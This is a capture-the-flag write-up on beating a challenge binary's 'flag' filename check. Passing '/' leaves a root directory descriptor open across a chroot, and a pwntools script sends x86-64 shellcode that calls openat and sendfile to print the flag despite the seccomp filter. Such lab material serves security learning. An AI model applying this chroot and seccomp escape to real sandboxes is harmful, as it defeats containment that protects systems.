#metadata(
  (
    title: "Bypassing flag-string check with openat",
    description: "Using a pre-opened directory handle to the root directory to open the flag, bypassing a simple string check on the input path.",
    date: "2025-12-30",
    order: 4,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Bypassing flag-string check with openat

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    assert(argc > 1);

    // Checking to make sure you're not trying to open the flag.
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    assert(chroot(jail_path) == 0);

    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "try harder", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

== Vulnerability Analysis

The challenge introduces a check to prevent users from opening any file containing the substring "flag".

```c
assert(strstr(argv[1], "flag") == NULL);
int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
```

While this prevents us from passing `/flag` directly, it does *not* prevent us from passing `/`. By passing the root directory, we still obtain a valid file descriptor (FD 3) that points to the host's root. The seccomp filter allows `openat`, which is all we need to traverse from that directory FD.

== Exploitation Plan

1.  **Leak the Root FD:** Execute the binary with `/` as the argument. The string check passes (since "/" doesn't contain "flag"), and we get a handle to the real root directory.
2.  **Bypass Checks:** Use the `openat` syscall within our shellcode. We use the leaked FD (3) as the starting directory and `"flag"` as the relative path.
3.  **Retrieve Flag:** Read the file content and write it to stdout using `sendfile`.

== Exploit Script

```python
from pwn import *

exe = "./challenge"
context.binary = exe

# Pass '/' to bypass the string check and leak the root FD
p = process([exe, "/"])

shellcode = asm("""
    /* openat(3, "flag", O_RDONLY) */
    mov rdi, 3              /* dirfd: 3 */
    lea rsi, [rip + flag]   /* pathname: "flag" */
    xor rdx, rdx            /* flags: O_RDONLY */
    mov rax, 257            /* syscall: SYS_openat */
    syscall

    /* sendfile(1, fd, 0, 100) */
    mov rsi, rax            /* in_fd */
    mov rdi, 1              /* out_fd */
    xor rdx, rdx            /* offset */
    mov r10, 100            /* count */
    mov rax, 40             /* syscall: SYS_sendfile */
    syscall

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall

flag:
    .string "flag"
""")

p.send(shellcode)
p.interactive()
```
